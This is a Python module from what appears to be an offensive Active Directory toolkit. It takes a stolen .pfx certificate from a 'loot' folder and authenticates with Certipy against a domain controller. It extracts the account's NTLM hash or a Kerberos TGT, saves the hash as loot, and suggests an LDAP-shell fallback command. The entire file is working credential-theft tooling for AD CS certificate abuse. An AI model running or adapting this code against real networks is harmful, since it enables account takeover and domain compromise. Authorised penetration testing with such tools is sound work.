# modules/adcs/pfx2hash.py

import os
import re
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

loot_dir = "loot"

def abuse_pfx2hash(session):
    print(blue("[*] Available PFX files in loot/:"))
    pfx_files = [f for f in os.listdir(loot_dir) if f.lower().endswith(".pfx")]

    if not pfx_files:
        print(red("[-] No PFX files found in loot/"))
        return

    for f in pfx_files:
        print(f" - {f}")

    target = input("[?] Enter PFX filename to use: ").strip()
    full_path = os.path.join(loot_dir, target)

    if not os.path.exists(full_path):
        print(red(f"[-] File not found: {full_path}"))
        return

    print(blue(f"[*] Running Certipy auth against {session.dc_ip} using domain {session.domain}\n\nPress Enter...."))
    cmd = f"certipy-ad auth -pfx {full_path} -dc-ip {session.dc_ip} -domain {session.domain}"
    out, err = run_command(cmd)
    combined = out + "\n" + err

    # Check for missing client auth EKU
    if "Certificate is not valid for client authentication" in combined:
        print(red("[-] Certificate is not valid for client authentication"))
        print(yellow("[*] You can try running Certipy manually with LDAP shell:"))
        print(yellow(f"    certipy auth -pfx {full_path} -dc-ip {session.dc_ip} -domain {session.domain} -ldap-shell"))
        return

    # Try to extract NTLM hash
    ntlm_match = re.search(r"Got hash for '.*?':\s*([a-f0-9]{32}:[a-f0-9]{32})", combined, re.IGNORECASE)

    if ntlm_match:
        ntlm_hash = ntlm_match.group(1).strip()
        print(green(f"[+] NTLM hash extracted: {ntlm_hash}"))
        save_loot("pfx_ntlm.txt", ntlm_hash)
    else:
        print(yellow("[*] No NTLM hash extracted."))
        if "Got TGT" in combined:
            print(green("[+] Certificate is valid. TGT was obtained."))
            print(green("[+] You can use the .ccache file with Kerberos-aware tools."))

    # Always show identity info
    for line in combined.splitlines():
        if "SAN UPN" in line or "Using principal" in line:
            print(yellow(line.strip()))
